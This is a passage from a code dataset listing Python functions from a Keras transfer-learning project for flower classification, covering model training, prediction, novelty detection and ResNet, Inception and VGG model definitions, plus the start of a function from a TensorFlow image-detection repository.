            image_class = i.split(os.sep)[-2]
            keras_class = int(classes_in_keras_format[image_class])
            y_true.append(keras_class)
        except Exception:
            y_true.append(os.path.split(i)[1])
        inputs.append(x)
    return (y_true, inputs)"
Arsey/keras-transfer-learning-for-oxford102,predict,"def predict(path):
    files = get_files(path)
    n_files = len(files)
    print('Found {} files'.format(n_files))
    if args.novelty_detection:
        activation_function = util.get_activation_function(model, model_module.noveltyDetectionLayerName)
        novelty_detection_clf = joblib.load(config.get_novelty_detection_model_path())
    y_trues = []
    predictions = np.zeros(shape=(n_files,))
    nb_batch = int(np.ceil(n_files / float(args.batch_size)))
    for n in range(0, nb_batch):
        print('Batch {}'.format(n))
        n_from = n * args.batch_size
        n_to = min(args.batch_size * (n + 1), n_files)
        (y_true, inputs) = get_inputs_and_trues(files[n_from:n_to])
        y_trues += y_true
        if args.store_activations:
            util.save_activations(model, inputs, files[n_from:n_to], model_module.noveltyDetectionLayerName, n)
        if args.novelty_detection:
            activations = util.get_activations(activation_function, [inputs[0]])
            nd_preds = novelty_detection_clf.predict(activations)[0]
            print(novelty_detection_clf.__classes[nd_preds])
        if not args.store_activations:
            if n == 0:
                print('Warming up the model')
                start = time.clock()
                model.predict(np.array([inputs[0]]))
                end = time.clock()
                print('Warming up took {} s'.format(end - start))
            start = time.clock()
            out = model.predict(np.array(inputs))
            end = time.clock()
            predictions[n_from:n_to] = np.argmax(out, axis=1)
            print('Prediction on batch {} took: {}'.format(n, end - start))
    if not args.store_activations:
        for (i, p) in enumerate(predictions):
            recognized_class = list(classes_in_keras_format.keys())[list(classes_in_keras_format.values()).index(p)]
            print('| should be {} ({}) -> predicted as {} ({})'.format(y_trues[i], files[i].split(os.sep)[-2], p, recognized_class))
        if args.accuracy:
            print('Accuracy {}'.format(accuracy_score(y_true=y_trues, y_pred=predictions)))
        if args.plot_confusion_matrix:
            cnf_matrix = confusion_matrix(y_trues, predictions)
            util.plot_confusion_matrix(cnf_matrix, config.classes, normalize=False)
            util.plot_confusion_matrix(cnf_matrix, config.classes, normalize=True)"
Arsey/keras-transfer-learning-for-oxford102,handle,"def handle(clientsocket):
    while 1:
        buf = clientsocket.recv(config.buffer_size)
        if buf == 'exit'.encode():
            return
        response = ''
        if os.path.isfile(buf):
            try:
                img = [model_module.load_img(buf)]
                out = model.predict(np.array(img))
                prediction = np.argmax(out)
                top10 = out[0].argsort()[-10:][::-1]
                class_indices = dict(zip(config.classes, range(len(config.classes))))
                keys = list(class_indices.keys())
                values = list(class_indices.values())
                answer = keys[values.index(prediction)]
                try:
                    acts = util.get_activations(af, img)
                    predicted_relativity = novelty_detection_clf.predict(acts)[0]
                    nd_class = novelty_detection_clf.__classes[predicted_relativity]
                except Exception as e:
                    print(e.message)
                    nd_class = 'related'
                top10_json = '['
                for (i, t) in enumerate(top10):
                    top10_json += '{""probability"":""%s"", ""class"":""%s""}%s' % (out[0][t], keys[values.index(t)], '' if i == 9 else ',')
                top10_json += ']'
                response = '{""probability"":""%s"",""class"":""%s"",""relativity"":""%s"",""top10"":%s}' % (out[0][prediction], answer, nd_class, top10_json)
                print(response)
            except Exception as e:
                print('Error', e)
                traceback.print_stack()
                response = UNKNOWN_ERROR
        else:
            response = FILE_DOES_NOT_EXIST
        clientsocket.sendall(response.encode())"
Arsey/keras-transfer-learning-for-oxford102,parse_args,"def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--data_dir', help='Path to data dir')
    parser.add_argument('--model', type=str, required=True, help='Base model architecture', choices=[config.MODEL_RESNET50, config.MODEL_RESNET152, config.MODEL_INCEPTION_V3, config.MODEL_VGG16])
    parser.add_argument('--nb_epoch', type=int, default=1000)
    parser.add_argument('--batch_size', type=int, default=32)
    parser.add_argument('--freeze_layers_number', type=int, help='will freeze the first N layers and unfreeze the rest')
    return parser.parse_args()"
Arsey/keras-transfer-learning-for-oxford102,init,"def init():
    util.lock()
    util.set_img_format()
    util.override_keras_directory_iterator_next()
    util.set_classes_from_train_dir()
    util.set_samples_info()
    if util.get_keras_backend_name() != 'theano':
        util.tf_allow_growth()
    if not os.path.exists(config.trained_dir):
        os.mkdir(config.trained_dir)"
Arsey/keras-transfer-learning-for-oxford102,train,"def train():
    model = util.get_model_class_instance(class_weight=util.get_class_weight(config.train_dir), nb_epoch=args.nb_epoch, batch_size=args.batch_size, freeze_layers_number=args.freeze_layers_number)
    model.train()
    print('Training is finished!')"
Arsey/keras-transfer-learning-for-oxford102,parse_args,"def parse_args():
    """"""
    Parse input arguments
    """"""
    parser = argparse.ArgumentParser()
    parser.add_argument('--model', type=str, required=True, help='Base model architecture', choices=[config.MODEL_RESNET50, config.MODEL_RESNET152, config.MODEL_INCEPTION_V3, config.MODEL_VGG16])
    parser.add_argument('--use_nn', action='store_true')
    args = parser.parse_args()
    return args"
Arsey/keras-transfer-learning-for-oxford102,encode,"def encode(df):
    label_encoder = LabelEncoder().fit(df['class'])
    labels = label_encoder.transform(df['class'])
    classes = list(label_encoder.classes_)
    df = df.drop(['class'], axis=1)
    return (df, labels, classes)"
Arsey/keras-transfer-learning-for-oxford102,train_logistic,"def train_logistic():
    df = pd.read_csv(config.activations_path)
    (df, y, classes) = encode(df)
    (X_train, X_test, y_train, y_test) = train_test_split(df.values, y, test_size=0.2, random_state=17)
    params = {'C': [10, 2, 0.9, 0.4, 0.1], 'tol': [0.0001, 0.001, 0.0005]}
    log_reg = LogisticRegression(solver='lbfgs', multi_class='multinomial', class_weight='balanced')
    clf = GridSearchCV(log_reg, params, scoring='neg_log_loss', refit=True, cv=3, n_jobs=-1)
    clf.fit(X_train, y_train)
    print('best params: ' + str(clf.best_params_))
    print('Accuracy: ', accuracy_score(y_test, clf.predict(X_test)))
    setattr(clf, '__classes', classes)
    joblib.dump(clf, config.get_novelty_detection_model_path())"
Arsey/keras-transfer-learning-for-oxford102,train_nn,"def train_nn():
    df = pd.read_csv(config.activations_path)
    (df, y, classes) = encode(df)
    (X_train, X_test, y_train, y_test) = train_test_split(df.values, y, test_size=0.2, random_state=17)
    model_module = util.get_model_class_instance()
    model = Sequential()
    model.add(Dense(48, input_dim=model_module.noveltyDetectionLayerSize, activation='elu', init='uniform'))
    model.add(Dropout(0.5))
    model.add(Dense(32, activation='elu', init='uniform'))
    model.add(Dropout(0.5))
    model.add(Dense(len(classes), activation='softmax', init='uniform'))
    model.compile(loss='sparse_categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])
    early_stopping = EarlyStopping(verbose=1, patience=40, monitor='val_loss')
    model_checkpoint = ModelCheckpoint(config.get_novelty_detection_model_path(), save_best_only=True, save_weights_only=True, monitor='val_loss')
    callbacks_list = [early_stopping, model_checkpoint]
    model.fit(X_train, y_train, nb_epoch=300, validation_data=(X_test, y_test), batch_size=16, callbacks=callbacks_list)
    out = model.predict(X_test)
    predictions = np.argmax(out, axis=1)
    print('Accuracy: ', accuracy_score(y_test, predictions))"
Arsey/keras-transfer-learning-for-oxford102,save_history,"def save_history(history, prefix):
    if 'acc' not in history.history:
        return
    if not os.path.exists(config.plots_dir):
        os.mkdir(config.plots_dir)
    img_path = os.path.join(config.plots_dir, '{}-%s.jpg'.format(prefix))
    plt.plot(history.history['acc'])
    plt.plot(history.history['val_acc'])
    plt.title('model accuracy')
    plt.ylabel('accuracy')
    plt.xlabel('epoch')
    plt.legend(['train', 'test'], loc='upper left')
    plt.savefig(img_path % 'accuracy')
    plt.close()
    plt.plot(history.history['loss'])
    plt.plot(history.history['val_loss'])
    plt.title('model loss')
    plt.ylabel('loss')
    plt.xlabel('epoch')
    plt.legend(['train', 'test'], loc='upper right')
    plt.savefig(img_path % 'loss')
    plt.close()"
Arsey/keras-transfer-learning-for-oxford102,plot_confusion_matrix,"def plot_confusion_matrix(cm, classes, normalize=False, title='Confusion matrix', cmap=plt.cm.Blues):
    """"""
    This function prints and plots the confusion matrix.
    Normalization can be applied by setting `normalize=True`.
    """"""
    confusion_matrix_dir = './confusion_matrix_plots'
    if not os.path.exists(confusion_matrix_dir):
        os.mkdir(confusion_matrix_dir)
    plt.cla()
    plt.figure()
    plt.imshow(cm, interpolation='nearest', cmap=cmap)
    plt.title(title)
    plt.colorbar()
    tick_marks = np.arange(len(classes))
    plt.xticks(tick_marks, classes, rotation=45)
    plt.yticks(tick_marks, classes)
    if normalize:
        cm = cm.astype('float') / cm.sum(axis=1)[:, np.newaxis]
        print('Normalized confusion matrix')
    else:
        print('Confusion matrix, without normalization')
    print(cm)
    thresh = cm.max() / 2.0
    for (i, j) in itertools.product(range(cm.shape[0]), range(cm.shape[1])):
        plt.text(j, i, cm[i, j], horizontalalignment='center', color='#BFD1D4' if cm[i, j] > thresh else 'black')
    plt.tight_layout()
    plt.ylabel('True label')
    plt.xlabel('Predicted label')
    if normalize:
        plt.savefig(os.path.join(confusion_matrix_dir, 'normalized.jpg'))
    else:
        plt.savefig(os.path.join(confusion_matrix_dir, 'without_normalization.jpg'))"
Arsey/keras-transfer-learning-for-oxford102,get_dir_imgs_number,"def get_dir_imgs_number(dir_path):
    allowed_extensions = ['*.png', '*.jpg', '*.jpeg', '*.bmp']
    number = 0
    for e in allowed_extensions:
        number += len(glob.glob(os.path.join(dir_path, e)))
    return number"
Arsey/keras-transfer-learning-for-oxford102,set_samples_info,"def set_samples_info():
    """"""Walks through the train and valid directories
    and returns number of images""""""
    white_list_formats = {'png', 'jpg', 'jpeg', 'bmp'}
    dirs_info = {config.train_dir: 0, config.validation_dir: 0}
    for d in dirs_info:
        iglob_iter = glob.iglob(d + '**/*.*')
        for i in iglob_iter:
            (filename, file_extension) = os.path.splitext(i)
            if file_extension[1:] in white_list_formats:
                dirs_info[d] += 1
    config.nb_train_samples = dirs_info[config.train_dir]
    config.nb_validation_samples = dirs_info[config.validation_dir]"
Arsey/keras-transfer-learning-for-oxford102,get_class_weight,"def get_class_weight(d):
    white_list_formats = {'png', 'jpg', 'jpeg', 'bmp'}
    class_number = dict()
    dirs = sorted([o for o in os.listdir(d) if os.path.isdir(os.path.join(d, o))])
    k = 0
    for class_name in dirs:
        class_number[k] = 0
        iglob_iter = glob.iglob(os.path.join(d, class_name, '*.*'))
        for i in iglob_iter:
            (_, ext) = os.path.splitext(i)
            if ext[1:] in white_list_formats:
                class_number[k] += 1
        k += 1
    total = np.sum(list(class_number.values()))
    max_samples = np.max(list(class_number.values()))
    mu = 1.0 / (total / float(max_samples))
    keys = class_number.keys()
    class_weight = dict()
    for key in keys:
        score = math.log(mu * total / float(class_number[key]))
        class_weight[key] = score if score > 1.0 else 1.0
    return class_weight"
Arsey/keras-transfer-learning-for-oxford102,set_classes_from_train_dir,"def set_classes_from_train_dir():
    """"""Returns classes based on directories in train directory""""""
    d = config.train_dir
    config.classes = sorted([o for o in os.listdir(d) if os.path.isdir(os.path.join(d, o))])"
Arsey/keras-transfer-learning-for-oxford102,override_keras_directory_iterator_next,"def override_keras_directory_iterator_next():
    """"""Overrides .next method of DirectoryIterator in Keras
      to reorder color channels for images from RGB to BGR""""""
    from keras.preprocessing.image import DirectoryIterator
    original_next = DirectoryIterator.next
    if 'custom_next' in str(original_next):
        return

    def custom_next(self):
        (batch_x, batch_y) = original_next(self)
        batch_x = batch_x[:, ::-1, :, :]
        return (batch_x, batch_y)
    DirectoryIterator.next = custom_next"
Arsey/keras-transfer-learning-for-oxford102,get_classes_in_keras_format,"def get_classes_in_keras_format():
    if config.classes:
        return dict(zip(config.classes, range(len(config.classes))))
    return None"
Arsey/keras-transfer-learning-for-oxford102,get_model_class_instance,"def get_model_class_instance(*args, **kwargs):
    module = importlib.import_module('models.{}'.format(config.model))
    return module.inst_class(*args, **kwargs)"
Arsey/keras-transfer-learning-for-oxford102,get_activation_function,"def get_activation_function(m, layer):
    x = [m.layers[0].input, K.learning_phase()]
    y = [m.get_layer(layer).output]
    return K.function(x, y)"
Arsey/keras-transfer-learning-for-oxford102,get_activations,"def get_activations(activation_function, X_batch):
    activations = activation_function([X_batch, 0])
    return activations[0][0]"
Arsey/keras-transfer-learning-for-oxford102,save_activations,"def save_activations(model, inputs, files, layer, batch_number):
    all_activations = []
    ids = []
    af = get_activation_function(model, layer)
    for i in range(len(inputs)):
        acts = get_activations(af, [inputs[i]])
        all_activations.append(acts)
        ids.append(files[i].split('/')[-2])
    submission = pd.DataFrame(all_activations)
    submission.insert(0, 'class', ids)
    submission.reset_index()
    if batch_number > 0:
        submission.to_csv(config.activations_path, index=False, mode='a', header=False)
    else:
        submission.to_csv(config.activations_path, index=False)"
Arsey/keras-transfer-learning-for-oxford102,lock,"def lock():
    if os.path.exists(config.lock_file):
        exit('Previous process is not yet finished.')
    with open(config.lock_file, 'w') as lock_file:
        lock_file.write(str(os.getpid()))"
Arsey/keras-transfer-learning-for-oxford102,unlock,"def unlock():
    if os.path.exists(config.lock_file):
        os.remove(config.lock_file)"
Arsey/keras-transfer-learning-for-oxford102,is_keras2,"def is_keras2():
    return keras.__version__.startswith('2')"
Arsey/keras-transfer-learning-for-oxford102,get_keras_backend_name,"def get_keras_backend_name():
    try:
        return K.backend()
    except AttributeError:
        return K._BACKEND"
Arsey/keras-transfer-learning-for-oxford102,tf_allow_growth,"def tf_allow_growth():
    import tensorflow as tf
    from keras.backend.tensorflow_backend import set_session
    tf_config = tf.ConfigProto()
    tf_config.gpu_options.allow_growth = True
    sess = tf.Session(config=tf_config)
    set_session(sess)"
Arsey/keras-transfer-learning-for-oxford102,set_img_format,"def set_img_format():
    try:
        if K.backend() == 'theano':
            K.set_image_data_format('channels_first')
        else:
            K.set_image_data_format('channels_last')
    except AttributeError:
        if K._BACKEND == 'theano':
            K.set_image_dim_ordering('th')
        else:
            K.set_image_dim_ordering('tf')"
Arsey/keras-transfer-learning-for-oxford102,custom_next,"def custom_next(self):
    (batch_x, batch_y) = original_next(self)
    batch_x = batch_x[:, ::-1, :, :]
    return (batch_x, batch_y)"
Arsey/keras-transfer-learning-for-oxford102,__init__,"def __init__(self, class_weight=None, nb_epoch=1000, batch_size=32, freeze_layers_number=None):
    self.model = None
    self.class_weight = class_weight
    self.nb_epoch = nb_epoch
    self.fine_tuning_patience = 20
    self.batch_size = batch_size
    self.freeze_layers_number = freeze_layers_number
    self.img_size = (224, 224)"
Arsey/keras-transfer-learning-for-oxford102,_create,"def _create(self):
    raise NotImplementedError('subclasses must override _create()')"
Arsey/keras-transfer-learning-for-oxford102,_fine_tuning,"def _fine_tuning(self):
    self.freeze_top_layers()
    self.model.compile(loss='categorical_crossentropy', optimizer=Adam(lr=1e-05), metrics=['accuracy'])
    self.model.summary()
    train_data = self.get_train_datagen(rotation_range=30.0, shear_range=0.2, zoom_range=0.2, horizontal_flip=True)
    callbacks = self.get_callbacks(config.get_fine_tuned_weights_path(), patience=self.fine_tuning_patience)
    if util.is_keras2():
        self.model.fit_generator(train_data, steps_per_epoch=config.nb_train_samples / float(self.batch_size), epochs=self.nb_epoch, validation_data=self.get_validation_datagen(), validation_steps=config.nb_validation_samples / float(self.batch_size), callbacks=callbacks, class_weight=self.class_weight)
    else:
        self.model.fit_generator(train_data, samples_per_epoch=config.nb_train_samples, nb_epoch=self.nb_epoch, validation_data=self.get_validation_datagen(), nb_val_samples=config.nb_validation_samples, callbacks=callbacks, class_weight=self.class_weight)
    self.model.save(config.get_model_path())"
Arsey/keras-transfer-learning-for-oxford102,train,"def train(self):
    print('Creating model...')
    self._create()
    print('Model is created')
    print('Fine tuning...')
    self._fine_tuning()
    self.save_classes()
    print('Classes are saved')"
Arsey/keras-transfer-learning-for-oxford102,load,"def load(self):
    print('Creating model')
    self.load_classes()
    self._create()
    self.model.load_weights(config.get_fine_tuned_weights_path())
    return self.model"
Arsey/keras-transfer-learning-for-oxford102,save_classes,"@staticmethod
def save_classes():
    joblib.dump(config.classes, config.get_classes_path())"
Arsey/keras-transfer-learning-for-oxford102,get_input_tensor,"def get_input_tensor(self):
    if util.get_keras_backend_name() == 'theano':
        return Input(shape=(3,) + self.img_size)
    else:
        return Input(shape=self.img_size + (3,))"
Arsey/keras-transfer-learning-for-oxford102,make_net_layers_non_trainable,"@staticmethod
def make_net_layers_non_trainable(model):
    for layer in model.layers:
        layer.trainable = False"
Arsey/keras-transfer-learning-for-oxford102,freeze_top_layers,"def freeze_top_layers(self):
    if self.freeze_layers_number:
        print('Freezing {} layers'.format(self.freeze_layers_number))
        for layer in self.model.layers[:self.freeze_layers_number]:
            layer.trainable = False
        for layer in self.model.layers[self.freeze_layers_number:]:
            layer.trainable = True"
Arsey/keras-transfer-learning-for-oxford102,get_callbacks,"@staticmethod
def get_callbacks(weights_path, patience=30, monitor='val_loss'):
    early_stopping = EarlyStopping(verbose=1, patience=patience, monitor=monitor)
    model_checkpoint = ModelCheckpoint(weights_path, save_best_only=True, save_weights_only=True, monitor=monitor)
    return [early_stopping, model_checkpoint]"
Arsey/keras-transfer-learning-for-oxford102,apply_mean,"@staticmethod
def apply_mean(image_data_generator):
    """"""Subtracts the dataset mean""""""
    image_data_generator.mean = np.array([103.939, 116.779, 123.68], dtype=np.float32).reshape((3, 1, 1))"
Arsey/keras-transfer-learning-for-oxford102,load_classes,"@staticmethod
def load_classes():
    config.classes = joblib.load(config.get_classes_path())"
Arsey/keras-transfer-learning-for-oxford102,load_img,"def load_img(self, img_path):
    img = image.load_img(img_path, target_size=self.img_size)
    x = image.img_to_array(img)
    x = np.expand_dims(x, axis=0)
    return preprocess_input(x)[0]"
Arsey/keras-transfer-learning-for-oxford102,get_train_datagen,"def get_train_datagen(self, *args, **kwargs):
    idg = ImageDataGenerator(*args, **kwargs)
    self.apply_mean(idg)
    return idg.flow_from_directory(config.train_dir, target_size=self.img_size, classes=config.classes)"
Arsey/keras-transfer-learning-for-oxford102,get_validation_datagen,"def get_validation_datagen(self, *args, **kwargs):
    idg = ImageDataGenerator(*args, **kwargs)
    self.apply_mean(idg)
    return idg.flow_from_directory(config.validation_dir, target_size=self.img_size, classes=config.classes)"
Arsey/keras-transfer-learning-for-oxford102,inst_class,"def inst_class(*args, **kwargs):
    return InceptionV3(*args, **kwargs)"
Arsey/keras-transfer-learning-for-oxford102,__init__,"def __init__(self, *args, **kwargs):
    super(InceptionV3, self).__init__(*args, **kwargs)
    if not self.freeze_layers_number:
        self.freeze_layers_number = 80
    self.img_size = (299, 299)"
Arsey/keras-transfer-learning-for-oxford102,_create,"def _create(self):
    base_model = KerasInceptionV3(weights='imagenet', include_top=False, input_tensor=self.get_input_tensor())
    self.make_net_layers_non_trainable(base_model)
    x = base_model.output
    x = GlobalAveragePooling2D()(x)
    x = Dense(self.noveltyDetectionLayerSize, activation='elu', name=self.noveltyDetectionLayerName)(x)
    predictions = Dense(len(config.classes), activation='softmax')(x)
    self.model = Model(input=base_model.input, output=predictions)"
Arsey/keras-transfer-learning-for-oxford102,preprocess_input,"def preprocess_input(self, x):
    x /= 255.0
    x -= 0.5
    x *= 2.0
    return x"
Arsey/keras-transfer-learning-for-oxford102,load_img,"def load_img(self, img_path):
    img = image.load_img(img_path, target_size=self.img_size)
    x = image.img_to_array(img)
    x = np.expand_dims(x, axis=0)
    return self.preprocess_input(x)[0]"
Arsey/keras-transfer-learning-for-oxford102,apply_mean,"@staticmethod
def apply_mean(image_data_generator):
    pass"
Arsey/keras-transfer-learning-for-oxford102,_fine_tuning,"def _fine_tuning(self):
    self.freeze_top_layers()
    self.model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.0001, decay=1e-06, momentum=0.9, nesterov=True), metrics=['accuracy'])
    self.model.fit_generator(self.get_train_datagen(rotation_range=30.0, shear_range=0.2, zoom_range=0.2, horizontal_flip=True, preprocessing_function=self.preprocess_input), samples_per_epoch=config.nb_train_samples, nb_epoch=self.nb_epoch, validation_data=self.get_validation_datagen(preprocessing_function=self.preprocess_input), nb_val_samples=config.nb_validation_samples, callbacks=self.get_callbacks(config.get_fine_tuned_weights_path(), patience=self.fine_tuning_patience), class_weight=self.class_weight)
    self.model.save(config.get_model_path())"
Arsey/keras-transfer-learning-for-oxford102,identity_block,"def identity_block(input_tensor, kernel_size, filters, stage, block):
    """"""The identity_block is the block that has no conv layer at shortcut
    # Arguments
        input_tensor: input tensor
        kernel_size: defualt 3, the kernel size of middle conv layer at main path
        filters: list of integers, the nb_filters of 3 conv layer at main path
        stage: integer, current stage label, used for generating layer names
        block: 'a','b'..., current block label, used for generating layer names
    """"""
    eps = 1.1e-05
    (nb_filter1, nb_filter2, nb_filter3) = filters
    conv_name_base = 'res' + str(stage) + block + '_branch'
    bn_name_base = 'bn' + str(stage) + block + '_branch'
    scale_name_base = 'scale' + str(stage) + block + '_branch'
    x = Convolution2D(nb_filter1, 1, 1, name=conv_name_base + '2a', bias=False)(input_tensor)
    x = BatchNormalization(epsilon=eps, axis=bn_axis, name=bn_name_base + '2a')(x)
    x = Scale(axis=bn_axis, name=scale_name_base + '2a')(x)
    x = Activation('relu', name=conv_name_base + '2a_relu')(x)
    x = ZeroPadding2D((1, 1), name=conv_name_base + '2b_zeropadding')(x)
    x = Convolution2D(nb_filter2, kernel_size, kernel_size, name=conv_name_base + '2b', bias=False)(x)
    x = BatchNormalization(epsilon=eps, axis=bn_axis, name=bn_name_base + '2b')(x)
    x = Scale(axis=bn_axis, name=scale_name_base + '2b')(x)
    x = Activation('relu', name=conv_name_base + '2b_relu')(x)
    x = Convolution2D(nb_filter3, 1, 1, name=conv_name_base + '2c', bias=False)(x)
    x = BatchNormalization(epsilon=eps, axis=bn_axis, name=bn_name_base + '2c')(x)
    x = Scale(axis=bn_axis, name=scale_name_base + '2c')(x)
    x = merge([x, input_tensor], mode='sum', name='res' + str(stage) + block)
    x = Activation('relu', name='res' + str(stage) + block + '_relu')(x)
    return x"
Arsey/keras-transfer-learning-for-oxford102,conv_block,"def conv_block(input_tensor, kernel_size, filters, stage, block, strides=(2, 2)):
    """"""conv_block is the block that has a conv layer at shortcut
    # Arguments
        input_tensor: input tensor
        kernel_size: defualt 3, the kernel size of middle conv layer at main path
        filters: list of integers, the nb_filters of 3 conv layer at main path
        stage: integer, current stage label, used for generating layer names
        block: 'a','b'..., current block label, used for generating layer names
    Note that from stage 3, the first conv layer at main path is with subsample=(2,2)
    And the shortcut should have subsample=(2,2) as well
    """"""
    eps = 1.1e-05
    (nb_filter1, nb_filter2, nb_filter3) = filters
    conv_name_base = 'res' + str(stage) + block + '_branch'
    bn_name_base = 'bn' + str(stage) + block + '_branch'
    scale_name_base = 'scale' + str(stage) + block + '_branch'
    x = Convolution2D(nb_filter1, 1, 1, subsample=strides, name=conv_name_base + '2a', bias=False)(input_tensor)
    x = BatchNormalization(epsilon=eps, axis=bn_axis, name=bn_name_base + '2a')(x)
    x = Scale(axis=bn_axis, name=scale_name_base + '2a')(x)
    x = Activation('relu', name=conv_name_base + '2a_relu')(x)
    x = ZeroPadding2D((1, 1), name=conv_name_base + '2b_zeropadding')(x)
    x = Convolution2D(nb_filter2, kernel_size, kernel_size, name=conv_name_base + '2b', bias=False)(x)
    x = BatchNormalization(epsilon=eps, axis=bn_axis, name=bn_name_base + '2b')(x)
    x = Scale(axis=bn_axis, name=scale_name_base + '2b')(x)
    x = Activation('relu', name=conv_name_base + '2b_relu')(x)
    x = Convolution2D(nb_filter3, 1, 1, name=conv_name_base + '2c', bias=False)(x)
    x = BatchNormalization(epsilon=eps, axis=bn_axis, name=bn_name_base + '2c')(x)
    x = Scale(axis=bn_axis, name=scale_name_base + '2c')(x)
    shortcut = Convolution2D(nb_filter3, 1, 1, subsample=strides, name=conv_name_base + '1', bias=False)(input_tensor)
    shortcut = BatchNormalization(epsilon=eps, axis=bn_axis, name=bn_name_base + '1')(shortcut)
    shortcut = Scale(axis=bn_axis, name=scale_name_base + '1')(shortcut)
    x = merge([x, shortcut], mode='sum', name='res' + str(stage) + block)
    x = Activation('relu', name='res' + str(stage) + block + '_relu')(x)
    return x"
Arsey/keras-transfer-learning-for-oxford102,inst_class,"def inst_class(*args, **kwargs):
    return ResNet50(*args, **kwargs)"
Arsey/keras-transfer-learning-for-oxford102,__init__,"def __init__(self, weights=None, axis=-1, momentum=0.9, beta_init='zero', gamma_init='one', **kwargs):
    self.momentum = momentum
    self.axis = axis
    self.beta_init = initializations.get(beta_init)
    self.gamma_init = initializations.get(gamma_init)
    self.initial_weights = weights
    super(Scale, self).__init__(**kwargs)"
Arsey/keras-transfer-learning-for-oxford102,build,"def build(self, input_shape):
    self.input_spec = [InputSpec(shape=input_shape)]
    shape = (int(input_shape[self.axis]),)
    self.gamma = self.gamma_init(shape, name='{}_gamma'.format(self.name))
    self.beta = self.beta_init(shape, name='{}_beta'.format(self.name))
    self.trainable_weights = [self.gamma, self.beta]
    if self.initial_weights is not None:
        self.set_weights(self.initial_weights)
        del self.initial_weights"
Arsey/keras-transfer-learning-for-oxford102,call,"def call(self, x, mask=None):
    input_shape = self.input_spec[0].shape
    broadcast_shape = [1] * len(input_shape)
    broadcast_shape[self.axis] = input_shape[self.axis]
    out = K.reshape(self.gamma, broadcast_shape) * x + K.reshape(self.beta, broadcast_shape)
    return out"
Arsey/keras-transfer-learning-for-oxford102,get_config,"def get_config(self):
    config = {'momentum': self.momentum, 'axis': self.axis}
    base_config = super(Scale, self).get_config()
    return dict(list(base_config.items()) + list(config.items()))"
Arsey/keras-transfer-learning-for-oxford102,__init__,"def __init__(self, *args, **kwargs):
    super(ResNet50, self).__init__(*args, **kwargs)
    if not self.freeze_layers_number:
        self.freeze_layers_number = 590
    self.weights_path = 'weights/resnet152_weights_th.h5'"
Arsey/keras-transfer-learning-for-oxford102,_create,"def _create(self):
    """"""Instantiate the ResNet152 architecture,
       # Arguments
           weights_path: path to pretrained weight file
       # Returns
           A Keras model instance.
       """"""
    eps = 1.1e-05
    global bn_axis
    if K.image_dim_ordering() == 'tf':
        bn_axis = 3
        img_input = Input(shape=(224, 224, 3), name='data')
    else:
        bn_axis = 1
        img_input = Input(shape=(3, 224, 224), name='data')
    x = ZeroPadding2D((3, 3), name='conv1_zeropadding')(img_input)
    x = Convolution2D(64, 7, 7, subsample=(2, 2), name='conv1', bias=False)(x)
    x = BatchNormalization(epsilon=eps, axis=bn_axis, name='bn_conv1')(x)
    x = Scale(axis=bn_axis, name='scale_conv1')(x)
    x = Activation('relu', name='conv1_relu')(x)
    x = MaxPooling2D((3, 3), strides=(2, 2), name='pool1')(x)
    x = conv_block(x, 3, [64, 64, 256], stage=2, block='a', strides=(1, 1))
    x = identity_block(x, 3, [64, 64, 256], stage=2, block='b')
    x = identity_block(x, 3, [64, 64, 256], stage=2, block='c')
    x = conv_block(x, 3, [128, 128, 512], stage=3, block='a')
    for i in range(1, 8):
        x = identity_block(x, 3, [128, 128, 512], stage=3, block='b' + str(i))
    x = conv_block(x, 3, [256, 256, 1024], stage=4, block='a')
    for i in range(1, 36):
        x = identity_block(x, 3, [256, 256, 1024], stage=4, block='b' + str(i))
    x = conv_block(x, 3, [512, 512, 2048], stage=5, block='a')
    x = identity_block(x, 3, [512, 512, 2048], stage=5, block='b')
    x = identity_block(x, 3, [512, 512, 2048], stage=5, block='c')
    x_fc = AveragePooling2D((7, 7), name='avg_pool')(x)
    model = Model(img_input, x_fc)
    if self.weights_path:
        model.load_weights(self.weights_path, by_name=True)
    self.make_net_layers_non_trainable(model)
    x = model.output
    x = Flatten()(x)
    x = Dropout(0.5)(x)
    x = Dense(self.noveltyDetectionLayerSize, activation='elu', name=self.noveltyDetectionLayerName)(x)
    x = Dropout(0.5)(x)
    predictions = Dense(len(config.classes), activation='softmax', name='predictions')(x)
    self.model = Model(input=model.input, output=predictions)"
Arsey/keras-transfer-learning-for-oxford102,inst_class,"def inst_class(*args, **kwargs):
    return ResNet50(*args, **kwargs)"
Arsey/keras-transfer-learning-for-oxford102,__init__,"def __init__(self, *args, **kwargs):
    super(ResNet50, self).__init__(*args, **kwargs)
    if not self.freeze_layers_number:
        self.freeze_layers_number = 80"
Arsey/keras-transfer-learning-for-oxford102,_create,"def _create(self):
    base_model = KerasResNet50(include_top=False, input_tensor=self.get_input_tensor())
    self.make_net_layers_non_trainable(base_model)
    x = base_model.output
    x = Flatten()(x)
    x = Dropout(0.5)(x)
    x = Dense(self.noveltyDetectionLayerSize, activation='elu', name=self.noveltyDetectionLayerName)(x)
    x = Dropout(0.5)(x)
    predictions = Dense(len(config.classes), activation='softmax', name='predictions')(x)
    self.model = Model(input=base_model.input, output=predictions)"
Arsey/keras-transfer-learning-for-oxford102,inst_class,"def inst_class(*args, **kwargs):
    return VGG16(*args, **kwargs)"
Arsey/keras-transfer-learning-for-oxford102,__init__,"def __init__(self, *args, **kwargs):
    super(VGG16, self).__init__(*args, **kwargs)"
Arsey/keras-transfer-learning-for-oxford102,_create,"def _create(self):
    base_model = KerasVGG16(weights='imagenet', include_top=False, input_tensor=self.get_input_tensor())
    self.make_net_layers_non_trainable(base_model)
    x = base_model.output
    x = Flatten()(x)
    x = Dense(4096, activation='elu', name='fc1')(x)
    x = Dropout(0.6)(x)
    x = Dense(self.noveltyDetectionLayerSize, activation='elu', name=self.noveltyDetectionLayerName)(x)
    x = Dropout(0.6)(x)
    predictions = Dense(len(config.classes), activation='softmax', name='predictions')(x)
    self.model = Model(input=base_model.input, output=predictions)"
ArunMichaelDsouza/tensorflow-image-detection,create_image_lists,"def create_image_lists(image_dir, testing_percentage, validation_percentage):
    """"""Builds a list of training images from the file system.

  Analyzes the sub folders in the image directory, splits them into stable
  training, testing, and validation sets, and returns a data structure
  describing the lists of images for each label and their paths.

  Args:
    image_dir: String path to a folder containing subfolders of images.
    testing_percentage: Integer percentage of the images to reserve for tests.
    validation_percentage: Integer percentage of images reserved for validation.

  Returns:
    A dictionary containing an entry for each label subfolder, with images split
    into training, testing, and validation sets within each label.
  """"""
